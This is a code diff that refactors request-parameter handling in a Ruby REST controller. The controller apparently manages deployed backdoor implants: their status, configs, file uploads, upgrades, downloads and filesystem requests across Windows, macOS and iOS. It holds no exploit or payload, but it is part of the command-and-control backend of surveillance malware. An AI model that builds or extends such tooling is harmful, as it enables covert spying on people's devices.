@@ -20,8 +20,8 @@ class BackdoorController < RESTController
     classes = {}
 
     # request for a specific instance
-    if params['backdoor'] then
-      Item.where({_kind: 'factory', build: params['backdoor']}).each do |entry|
+    if @params['_id'] then
+      Item.where({_kind: 'factory', build: @params['_id']}).each do |entry|
           classes[entry[:build]] = entry[:confkey]
       end
     # all of them
@@ -30,24 +30,18 @@ class BackdoorController < RESTController
           classes[entry[:build]] = entry[:confkey]
         end
     end
-
+    
     return RESTController.ok(classes)
   end
-
   
   # retrieve the status of a backdoor instance.
   def status
     require_auth_level :server
     
-    request = JSON.parse(params['backdoor'])
-
-    # by default demo is off
-    demo = false
-
     # parse the platform to check if the backdoor is in demo mode ( -DEMO appended )
-    demo = true unless request['subtype']['-DEMO'].nil?
-    platform = request['subtype'].gsub(/-DEMO/, '').downcase
-
+    demo = @params['subtype'].end_with? '-DEMO'
+    platform = @params['subtype'].gsub(/-DEMO/, '').downcase
+    
     # retro compatibility for older backdoors (pre 8.0) sending win32, win64, ios, osx
     case platform
       when 'win32', 'win64'
@@ -57,9 +51,9 @@ class BackdoorController < RESTController
       when 'macos'
         platform = 'osx'
     end
-
+    
     # is the backdoor already in the database? (has it synchronized at least one time?)
-    backdoor = Item.where({_kind: 'backdoor', build: request['build_id'], instance: request['instance_id'], platform: platform, demo: demo}).first
+    backdoor = Item.where({_kind: 'backdoor', build: @params['build'], instance: @params['instance'], platform: platform, demo: demo}).first
 
     # yes it is, return the status
     unless backdoor.nil?
@@ -77,7 +71,7 @@ class BackdoorController < RESTController
     end
 
     # search for the factory of that instance
-    factory = Item.where({_kind: 'factory', build: request['build_id'], status: 'open'}).first
+    factory = Item.where({_kind: 'factory', build: @params['build'], status: 'open'}).first
 
     # the status of the factory must be open otherwise no instance can be cloned from it
     return RESTController.not_found if factory.nil?
@@ -93,7 +87,7 @@ class BackdoorController < RESTController
 
     # specialize it with the platform and the unique instance
     backdoor.platform = platform
-    backdoor.instance = request['instance_id']
+    backdoor.instance = @params['instance']
     backdoor.demo = demo
 
     # default is queued
@@ -118,9 +112,9 @@ class BackdoorController < RESTController
 
 
   def config
-    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
 
-    case @req_method
+    case @request[:method]
       when 'GET'
         config = backdoor.configs.where(:sent.exists => false).last
         return RESTController.not_found if config.nil?
@@ -136,7 +130,7 @@ class BackdoorController < RESTController
         config = backdoor.configs.where(:sent.exists => false).last
         config.sent = Time.now.getutc.to_i
         config.save
-        trace :info, "[#{@req_peer}] Configuration sent [#{params['backdoor']}]"
+        trace :info, "[#{@request[:peer]}] Configuration sent [#{@params['_id']}]"
     end
     
     return RESTController.ok
@@ -147,7 +141,7 @@ class BackdoorController < RESTController
   def uploads
     require_auth_level :server, :tech
 
-    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.upload_requests
 
     return RESTController.ok(list)
@@ -157,19 +151,19 @@ class BackdoorController < RESTController
   def upload
     require_auth_level :server, :tech
 
-    request = JSON.parse(params['backdoor'])
+    puts @params.inspect
 
-    case @req_method
+    case @request[:method]
       when 'GET'
-        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
-        upl = backdoor.upload_requests.where({ _id: request['upload_id']}).first
+        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
+        upl = backdoor.upload_requests.where({ _id: @params['upload']}).first
         content = GridFS.instance.get upl[:_grid].first
-        trace :info, "[#{@req_peer}] Requested the UPLOAD #{request} -- #{content.file_length.to_s_bytes}"
+        trace :info, "[#{@request[:peer]}] Requested the UPLOAD #{@params['upload']} -- #{content.file_length.to_s_bytes}"
         return RESTController.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
-        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
-        backdoor.upload_requests.destroy_all(conditions: { _id: request['upload_id']})
-        trace :info, "[#{@req_peer}] Deleted the UPLOAD #{request}"
+        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
+        backdoor.upload_requests.destroy_all(conditions: { _id: @params['upload']})
+        trace :info, "[#{@request[:peer]}] Deleted the UPLOAD #{@params['upload']}"
     end
     
     return RESTController.ok
@@ -179,9 +173,9 @@ class BackdoorController < RESTController
   def upgrades
     require_auth_level :server, :tech
     
-    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.upgrade_requests
-    
+
     return RESTController.ok(list)
   end
   
@@ -189,19 +183,17 @@ class BackdoorController < RESTController
   def upgrade
     require_auth_level :server, :tech
 
-    request = JSON.parse(params['backdoor'])
-
-    case @req_method
+    case @request[:method]
       when 'GET'
-        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
-        upgr = backdoor.upgrade_requests.where({ _id: request['upgrade_id']}).first
-        content = GridFS.instance.get upgr[:_grid].first
-        trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{content.file_length.to_s_bytes}"
+        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
+        upl = backdoor.upgrade_requests.where({ _id: @params['upgrade']}).first
+        content = GridFS.instance.get upl[:_grid].first
+        trace :info, "[#{@request[:peer]}] Requested the UPGRADE #{@params['upgrade']} -- #{content.file_length.to_s_bytes}"
         return RESTController.ok(content.read, {content_type: content.content_type})
       when 'DELETE'
-        backdoor = Item.where({_kind: 'backdoor', _id: request['backdoor_id']}).first
-        backdoor.upgrade_requests.destroy_all
-        trace :info, "[#{@req_peer}] Deleted the UPGRADE #{request}"
+        backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
+        backdoor.upgrade_requests.destroy_all(conditions: { _id: @params['upgrade']})
+        trace :info, "[#{@request[:peer]}] Deleted the UPGRADE #{@params['upgrade']}"
     end
     
     return RESTController.ok
@@ -211,7 +203,7 @@ class BackdoorController < RESTController
   def downloads
     require_auth_level :server, :tech
 
-    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.download_requests
 
     return RESTController.ok(list)
@@ -236,7 +228,7 @@ class BackdoorController < RESTController
   def filesystems
     require_auth_level :server, :tech
     
-    backdoor = Item.where({_kind: 'backdoor', _id: params['backdoor']}).first
+    backdoor = Item.where({_kind: 'backdoor', _id: @params['_id']}).first
     list = backdoor.filesystem_requests
 
     return RESTController.ok(list)
